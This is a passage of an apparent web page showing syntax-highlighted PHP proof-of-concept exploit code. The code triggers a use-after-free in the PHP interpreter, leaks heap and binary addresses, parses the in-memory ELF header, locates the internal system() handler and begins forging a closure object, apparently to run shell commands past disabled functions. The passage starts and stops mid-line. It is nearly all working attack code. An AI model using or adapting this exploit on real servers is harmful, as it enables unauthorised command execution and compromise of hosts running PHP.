class=\"token operator\">==</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\"># PT_LOAD, PF_Read_Write</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                <span class=\"token comment\"># handle pie</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>                <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$e_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$p_vaddr</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$p_vaddr</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>                <span class=\"token variable\">$data_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p_memsz</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\"># PT_LOAD, PF_Read_exec</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                <span class=\"token variable\">$text_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p_memsz</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$data_addr</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token variable\">$text_size</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token variable\">$data_size</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_size</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data_size</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_basic_funcs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        <span class=\"token keyword\">list</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_size</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data_size</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_size</span> <span class=\"token operator\">/</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>                <span class=\"token variable\">$deref</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>                <span class=\"token comment\"># 'constant' constant check</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deref</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0x746e6174736e6f63</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>                    <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>                <span class=\"token variable\">$deref</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>                <span class=\"token comment\"># 'bin2hex' constant check</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deref</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0x786568326e6962</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>                    <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_binary_base</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$binary_leak</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>        <span class=\"token variable\">$base</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>        <span class=\"token variable\">$start</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$binary_leak</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xfffffffffffff000</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>            <span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$start</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x1000</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x10102464c457f</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\"># ELF header</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token variable\">$addr</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>        <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            <span class=\"token variable\">$f_entry</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>            <span class=\"token variable\">$f_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_entry</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_name</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x6d6574737973</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\"># system</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>            <span class=\"token variable\">$addr</span> <span class=\"token operator\">+=</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_entry</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">my_str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>        <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>            <span class=\"token variable\">$s</span><span class=\"token operator\">.=</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"120\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">trigger_uaf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>        <span class=\"token comment\"># str_shuffle prevents opcache string interning</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>        <span class=\"token variable\">$arg</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_shuffle</span><span class=\"token punctuation\">(</span><span class=\"token function\">my_str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'A'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">79</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>        <span class=\"token variable\">$vuln</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>        <span class=\"token variable\">$vuln</span><span class=\"token operator\">-></span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$arg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token constant\">PHP_OS</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'WIN'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'This PoC is for *nix systems only.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    <span class=\"token variable\">$n_alloc</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> <span class=\"token comment\"># increase this value if UAF fails</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token variable\">$contiguous</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$n_alloc</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>        <span class=\"token variable\">$contiguous</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_shuffle</span><span class=\"token punctuation\">(</span><span class=\"token function\">my_str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'A'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">79</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>    <span class=\"token function\">trigger_uaf</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    <span class=\"token variable\">$abc</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'args'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>    <span class=\"token variable\">$helper</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Helper</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>    <span class=\"token variable\">$helper</span><span class=\"token operator\">-></span><span class=\"token property\">b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">79</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"UAF failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>    <span class=\"token comment\"># leaks</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>    <span class=\"token variable\">$closure_handlers</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>    <span class=\"token variable\">$php_heap</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>    <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$php_heap</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>    <span class=\"token comment\"># fake value</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    <span class=\"token comment\"># fake reference</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>    <span class=\"token variable\">$closure_obj</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>    <span class=\"token variable\">$binary_leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$closure_handlers</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_binary_base</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$binary_leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't determine binary base address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$elf</span> <span class=\"token operator\">=</span> <span class=\"token function\">parse_elf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't parse ELF header\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_basic_funcs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't get basic_functions address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$zif_system</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't get zif_system address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>    <span class=\"token comment\"># fake closure object</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>    <span class=\"token variable\">$fake_obj_offset</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xd0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x110</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">+=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>        <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span 